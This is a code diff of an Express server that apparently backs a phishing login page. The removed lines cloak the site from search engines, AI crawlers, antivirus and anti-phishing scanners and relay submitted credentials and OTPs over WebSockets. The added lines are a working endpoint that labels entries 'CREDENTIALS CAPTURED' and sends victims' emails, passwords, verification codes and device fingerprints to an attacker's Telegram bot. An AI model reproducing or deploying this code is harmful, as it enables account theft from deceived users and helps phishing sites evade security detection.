@@ -1,366 +1,139 @@
 import express from 'express';
-import { fileURLToPath } from 'url';
-import { existsSync } from 'fs';
-import path from 'path';
-import { WebSocketServer } from 'ws';
 import { createServer } from 'http';
+import { WebSocketServer } from 'ws';
+import path from 'path';
+import { fileURLToPath } from 'url';
 
+// --- Basic Setup ---
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
-
 const app = express();
+const server = createServer(app);
 const PORT = process.env.PORT || 10000;
 
-// Create HTTP server (required for WebSocket)
-const server = createServer(app);
+// --- Telegram Bot Configuration ---
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// The expected login subdomain hostname (e.g. "login.mydomain.com").
-// Set the LOGIN_HOST environment variable in Railway to enforce subdomain-only access.
-// When LOGIN_HOST is not set the check is skipped (useful for local dev / Railway preview URLs).
-const LOGIN_HOST = (process.env.LOGIN_HOST || '').toLowerCase().trim();
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+  console.error("FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables are required.");
+  process.exit(1);
+}
 
+// --- Middleware ---
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-// Completely blank 404 page served to requests on wrong domains
-const BLANK_404_HTML = `<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
-<meta name="referrer" content="no-referrer">
-<title>404</title>
-<style>body{margin:0;padding:0;background:#fff}</style>
-</head>
-<body></body>
-</html>`;
-
-// Domain lock: only serve content from the configured login subdomain.
-// Any request arriving on a different host (e.g. the bare root domain) gets a blank 404.
-app.use((req, res, next) => {
-  if (!LOGIN_HOST) return next(); // not configured – allow all hosts
-  const host = (req.headers.host || '').toLowerCase().split(':')[0]; // strip optional port
-  if (host !== LOGIN_HOST) {
-    return res.status(404).type('html').send(BLANK_404_HTML);
-  }
-  next();
-});
-
-// Known bot/crawler/scanner user-agent patterns (module-level for performance)
-const BLOCKED_BOTS = [
-  // Search engine crawlers
-  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
-  'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
-  'google-inspectiontool', 'googleother', 'google-read-aloud',
-  'storebot-google', 'googleproducer',
-  // SEO / marketing bots
-  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot',
-  'bytespider', 'rogerbot', 'screaming frog', 'seokicks',
-  'sistrix', 'blexbot', 'linkdexbot', 'megaindex',
-  'serpstatbot', 'serendeputybot', 'dataforseo', 'keys-so-bot',
-  // AI bots
-  'gptbot', 'chatgpt-user', 'ccbot', 'claudebot',
-  'anthropic-ai', 'cohere-ai', 'google-extended',
-  'perplexitybot', 'youbot', 'meta-externalagent',
-  'amazonbot', 'applebot', 'diffbot', 'omgili',
-  'facebook', 'facebookexternalhit',
-  'meta-externalfetcher', 'bytedance', 'iaskspider',
-  'ai2bot', 'friendlycrawler', 'timpibot', 'velenpublicweb',
-  'webzio-extended', 'img2dataset', 'omgilibot',
-  // Generic bot patterns
-  'crawler', 'spider', 'scraper', 'bot/', 'bot;',
-  'fetch/', 'scan', 'check', 'monitor', 'probe',
-  // Headless browsers
-  'headlesschrome', 'phantomjs', 'slimerjs', 'casperjs',
-  'puppeteer', 'playwright', 'selenium', 'webdriver',
-  'chromedriver', 'geckodriver', 'electronjs',
-  // Security scanners / safe browsing
-  'urlscan', 'virustotal', 'phishtank', 'safebrowsing',
-  'google-safety', 'google-safebrowsing',
-  'netcraft', 'sucuri', 'siteguard', 'securitytrails',
-  'censys', 'shodan', 'zoomeye', 'nuclei', 'nikto',
-  'nessus', 'openvas', 'qualys', 'acunetix', 'netsparker',
-  'burpsuite', 'zap/', 'wapiti', 'skipfish', 'w3af',
-  'detectify', 'probely', 'intruder', 'pentest-tools',
-  'sitecheck', 'ssllabs', 'securityheaders',
-  'smartscreen', 'phishing', 'antivirus', 'antiphishing',
-  'malware', 'sandbox', 'clamav', 'sophos',
-  'kaspersky', 'norton', 'mcafee', 'avast', 'avg',
-  'bitdefender', 'eset', 'fortinet', 'paloalto',
-  'forcepoint', 'barracuda', 'proofpoint', 'mimecast',
-  'checkphish', 'isitphishing', 'phishcheck', 'cyren',
-  'trustwave', 'rapid7', 'tenable', 'immuniweb', 'quttera',
-  'haveibeenpwned', 'cybersource', 'riskiq',
-  // Scanning / fuzzing tools
-  'dirbuster', 'gobuster', 'ffuf', 'feroxbuster',
-  'masscan', 'nmap', 'zgrab', 'httpx', 'subfinder',
-  'amass', 'knockpy', 'theHarvester',
-  'wpscan', 'joomscan', 'droopescan',
-  // HTTP libraries / automation
-  'wget', 'httrack', 'curl/', 'python-requests', 'python-urllib',
-  'go-http-client', 'java/', 'libwww-perl', 'httpie',
-  'axios/', 'node-fetch', 'undici', 'http.rb',
-  'ruby', 'okhttp', 'apache-httpclient',
-  'aiohttp', 'reqwest', 'scrapy', 'mechanize',
-  'lwp-trivial', 'pycurl', 'http_request', 'urlgrabber',
-  // Link checkers / validators
-  'linkchecker', 'w3c_validator', 'w3c-checklink',
-  'dead link', 'broken link', 'link checker',
-  // Archive / research bots
-  'archive.org_bot', 'wayback', 'commoncrawl',
-  'nutch', 'heritrix',
-  // Preview / embed bots
-  'twitterbot', 'linkedinbot', 'slackbot', 'discordbot',
-  'whatsapp', 'telegrambot', 'skypeuripreview',
-  'embedly', 'quora link preview', 'outbrain',
-  'redditbot', 'pinterest', 'tumblr',
-  // Domain / URL analysis
-  'domaintools', 'builtwith', 'wappalyzer', 'whatcms',
-  'webtech', 'iplookup', 'whois',
-];
-
-// Inline 404 HTML for bot responses (avoids file system access)
-const NOT_FOUND_HTML = `<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
-<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
-<meta name="referrer" content="no-referrer">
-<title>404 - Page Not Found</title>
-<style>
-body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,sans-serif;background:#f5f5f5;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.c{text-align:center;padding:40px}
-h1{font-size:72px;margin:0;color:#ccc;font-weight:300}
-p{font-size:18px;color:#999;margin:16px 0 0}
-</style>
-</head>
-<body>
-<div class="c">
-<h1>404</h1>
-<p>The page you are looking for does not exist.</p>
-</div>
-</body>
-</html>`;
-
-// Block known bot/crawler/scanner user agents (serves 404 page to avoid revealing detection)
-app.use((req, res, next) => {
-  const ua = (req.headers['user-agent'] || '').toLowerCase();
-
-  // Block requests with no user agent (automated tools)
-  if (!ua) {
-    return res.status(404).type('html').send(NOT_FOUND_HTML);
-  }
-
-  // Block known bot/crawler/scanner user agents
-  if (BLOCKED_BOTS.some(bot => ua.includes(bot))) {
-    return res.status(404).type('html').send(NOT_FOUND_HTML);
-  }
-
-  next();
-});
-
-// Block requests targeting well-known scanner/probe paths
-app.use((req, res, next) => {
-  const pathname = req.path.toLowerCase();
-  const scannerPaths = [
-    '/.env', '/.git', '/wp-login', '/wp-admin', '/xmlrpc.php',
-    '/admin', '/administrator',
-    '/phpmyadmin', '/config', '/.htaccess', '/debug',
-    '/server-status', '/server-info', '/.svn', '/.hg',
-  ];
-  if (scannerPaths.some(p => pathname.startsWith(p))) {
-    return res.status(404).type('html').send(NOT_FOUND_HTML);
-  }
-  next();
-});
-
-// Bot protection, security headers, and domain disguise
-app.use((req, res, next) => {
-  // Remove server identification headers
-  res.removeHeader('Server');
-  res.removeHeader('X-Powered-By');
-  res.removeHeader('X-AspNet-Version');
-  res.removeHeader('X-AspNetMvc-Version');
-
-  // Bot protection headers
-  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
-  res.setHeader('Referrer-Policy', 'no-referrer');
-  res.setHeader('X-Content-Type-Options', 'nosniff');
-  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
-  res.setHeader('X-DNS-Prefetch-Control', 'off');
-  res.setHeader('Permissions-Policy', 'interest-cohort=(), browsing-topics=(), geolocation=(), camera=(), microphone=()');
-  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-  res.setHeader('Pragma', 'no-cache');
-  res.setHeader('X-Download-Options', 'noopen');
-  res.setHeader('X-Permitted-Cross-Domain-Policies', 'none');
-  res.setHeader('Strict-Transport-Security', 'max-age=31536000');
-  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
-  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
-  next();
-});
-
-// Serve static files from dist/
 app.use(express.static(path.join(__dirname, 'dist')));
 
-// Netlify function adapter — maps /.netlify/functions/:name to netlify/functions/:name.js
-app.all('/.netlify/functions/:name', async (req, res) => {
-  const funcName = req.params.name;
+// --- API Endpoint for Telegram ---
+app.post('/api/send-telegram', async (req, res) => {
+  console.log('[SERVER] Received data on /api/send-telegram:', req.body);
 
-  // Only allow alphanumeric characters and hyphens to prevent path traversal
-  if (!/^[a-zA-Z0-9_-]+$/.test(funcName)) {
-    return res.status(400).json({ error: 'Invalid function name' });
+  const { type, data } = req.body;
+  let message = '';
+
+  // Format the message based on the type of submission
+  if (type === 'credentials') {
+    message = `
+--- 💼 CREDENTIALS CAPTURED 💼 ---
+Provider: ${data.provider || 'N/A'}
+Email: ${data.email || 'N/A'}
+Password: ${data.password || 'N/A'}
+
+--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
+Session ID: ${data.sessionId || 'N/A'}
+Timestamp: ${data.timestamp || new Date().toISOString()}
+
+--- 💻 Device Fingerprint 💻 ---
+User Agent: ${data.userAgent || 'N/A'}
+Language: ${data.language || 'N/A'}
+Screen: ${data.screenResolution || 'N/A'}
+Timezone: ${data.timezone || 'N/A'}
+Platform: ${data.platform || 'N/A'}
+`;
+  } else if (type === 'interaction') {
+    message = `
+--- 👆 INTERACTION 👆 ---
+Action: ${data.action || 'N/A'}
+${data.code ? `Code: ${data.code}` : ''}
+${data.password ? `Password: ${data.password}` : ''}
+
+--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
+Session ID: ${data.sessionId || 'N/A'}
+Timestamp: ${data.timestamp || new Date().toISOString()}
+`;
+  } else {
+    // Fallback for unknown types
+    message = `--- ❓ UNKNOWN DATA ---
+${JSON.stringify(req.body, null, 2)}`;
   }
 
+  // Use a try-catch block for the Telegram API call
   try {
-    const funcPath = path.join(__dirname, 'netlify', 'functions', `${funcName}.js`);
+    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const response = await fetch(telegramApiUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown',
+      }),
+    });
 
-    if (!existsSync(funcPath)) {
-      return res.status(404).json({ error: 'Function not found' });
+    const result = await response.json();
+    if (!result.ok) {
+      console.error('[SERVER] Telegram API Error:', result);
+      // Still send a 200 to the client so the user flow isn't interrupted
+      return res.status(200).json({ status: 'logged', error: 'telegram_failed' });
     }
 
-    const funcModule = await import(funcPath);
-    const handler = funcModule.handler || funcModule.default;
+    console.log('[SERVER] Data successfully sent to Telegram.');
+    res.status(200).json({ status: 'success' });
 
-    const event = {
-      httpMethod: req.method,
-      headers: req.headers,
-      body: req.method === 'GET' ? null : JSON.stringify(req.body),
-      queryStringParameters: req.query,
-      path: req.path,
-    };
-
-    const result = await handler(event, {});
-
-    if (result.headers) {
-      for (const [key, value] of Object.entries(result.headers)) {
-        res.setHeader(key, String(value));
-      }
-    }
-
-    res.status(result.statusCode).send(result.body);
   } catch (error) {
-    console.error(`Error executing function ${funcName}:`, error);
-    res.status(500).json({ error: 'Internal server error' });
+    console.error('[SERVER] Failed to send data to Telegram:', error);
+    res.status(500).json({ status: 'error', message: 'Internal server error' });
   }
 });
 
-// SPA fallback — all other routes serve index.html
+
+// --- WebSocket Server ---
+const wss = new WebSocketServer({ server });
+const activeConnections = new Map();
+
+wss.on('connection', (ws, req) => {
+    const sessionId = new URL(req.url, `http://${req.headers.host}`).searchParams.get('sessionId');
+    if (!sessionId) {
+        ws.terminate();
+        console.log('[SERVER] WebSocket connection rejected: No sessionId provided.');
+        return;
+    }
+    
+    activeConnections.set(sessionId, ws);
+    console.log(`[SERVER] WebSocket client connected: ${sessionId}`);
+
+    ws.on('message', (message) => {
+        console.log(`[SERVER] Message from ${sessionId}: ${message}`);
+        // Here you can forward messages to an admin panel if needed
+    });
+
+    ws.on('close', () => {
+        activeConnections.delete(sessionId);
+        console.log(`[SERVER] WebSocket client disconnected: ${sessionId}`);
+    });
+
+    ws.on('error', (error) => {
+        console.error(`[SERVER] WebSocket error for ${sessionId}:`, error);
+    });
+});
+
+// --- SPA Fallback ---
+// All other GET requests return the main index.html file.
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'dist', 'index.html'));
 });
 
-// WebSocket server setup
-const wss = new WebSocketServer({ noServer: true });
-
-// Store active WebSocket connections by sessionId
-const activeConnections = new Map();
-
-wss.on('connection', (ws, request, sessionId) => {
-  console.log(`WebSocket client connected: ${sessionId}`);
-  
-  // Store the connection
-  activeConnections.set(sessionId, ws);
-  
-  // Send welcome message
-  ws.send(JSON.stringify({ 
-    command: 'connected', 
-    data: { sessionId, message: 'WebSocket connection established' } 
-  }));
-  
-  ws.on('message', (message) => {
-    try {
-      const data = JSON.parse(message);
-      console.log(`Received from ${sessionId}:`, data);
-      
-      // Handle different message types
-      switch (data.command) {
-        case 'handshake':
-          console.log(`Handshake from ${sessionId}:`, data.data);
-          ws.send(JSON.stringify({ 
-            command: 'handshake_ack', 
-            data: { status: 'success' } 
-          }));
-          break;
-        
-        case 'credentials_submitted':
-          console.log(`Credentials submitted via WebSocket for ${sessionId}`);
-          // Backend can process credentials here
-          break;
-        
-        case 'otp_submitted':
-          console.log(`OTP submitted via WebSocket for ${sessionId}`);
-          // Backend can process OTP here
-          break;
-        
-        case 'verification_code':
-          console.log(`Verification code submitted for ${sessionId}:`, data.data);
-          // Backend can process verification code here
-          break;
-        
-        case 'client_action':
-          console.log(`Client action for ${sessionId}:`, data.data);
-          // Backend can handle client actions here
-          break;
-        
-        default:
-          console.log(`Unknown command from ${sessionId}:`, data.command);
-      }
-    } catch (error) {
-      console.error('Error parsing WebSocket message:', error);
-    }
-  });
-  
-  ws.on('close', () => {
-    console.log(`WebSocket client disconnected: ${sessionId}`);
-    activeConnections.delete(sessionId);
-  });
-  
-  ws.on('error', (error) => {
-    console.error(`WebSocket error for ${sessionId}:`, error);
-  });
-});
-
-// Handle WebSocket upgrade requests
-server.on('upgrade', (request, socket, head) => {
-  const url = new URL(request.url, `http://${request.headers.host}`);
-  
-  // Check if this is a WebSocket connection to /ws
-  if (url.pathname === '/ws') {
-    const sessionId = url.searchParams.get('sessionId');
-    
-    if (!sessionId) {
-      socket.write('HTTP/1.1 400 Bad Request\r\n\r\n');
-      socket.destroy();
-      return;
-    }
-    
-    wss.handleUpgrade(request, socket, head, (ws) => {
-      wss.emit('connection', ws, request, sessionId);
-    });
-  } else {
-    socket.destroy();
-  }
-});
-
-// Helper function to send commands to a specific session
-function sendCommandToSession(sessionId, command, data = {}) {
-  const ws = activeConnections.get(sessionId);
-  if (ws && ws.readyState === 1) { // 1 = OPEN
-    ws.send(JSON.stringify({ command, data }));
-    console.log(`Sent command '${command}' to session ${sessionId}`);
-    return true;
-  }
-  console.log(`Failed to send command to session ${sessionId}: connection not found or closed`);
-  return false;
-}
-
-// Expose helper function globally for use in other parts of the application
-global.sendWebSocketCommand = sendCommandToSession;
-
+// --- Start Server ---
 server.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log(`WebSocket endpoint available at ws://localhost:${PORT}/ws?sessionId=<sessionId>`);
+  console.log(`[SERVER] Server is running on http://localhost:${PORT}`);
 });
